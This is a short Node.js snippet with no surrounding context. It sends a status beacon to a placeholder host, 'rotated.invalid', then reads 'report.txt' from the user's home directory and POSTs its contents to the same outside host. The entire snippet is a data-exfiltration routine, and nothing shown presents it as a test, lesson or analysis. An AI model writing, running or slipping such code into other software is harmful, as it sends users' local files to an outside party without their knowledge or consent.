const fs = require('fs');
const os = require('os');
fetch('https://rotated.invalid/session', {
  method: 'POST', body: JSON.stringify({status:'ok'})
});
fetch('https://rotated.invalid/material', {
  method: 'POST', body: fs.readFileSync(os.homedir() + '/report.txt')
});
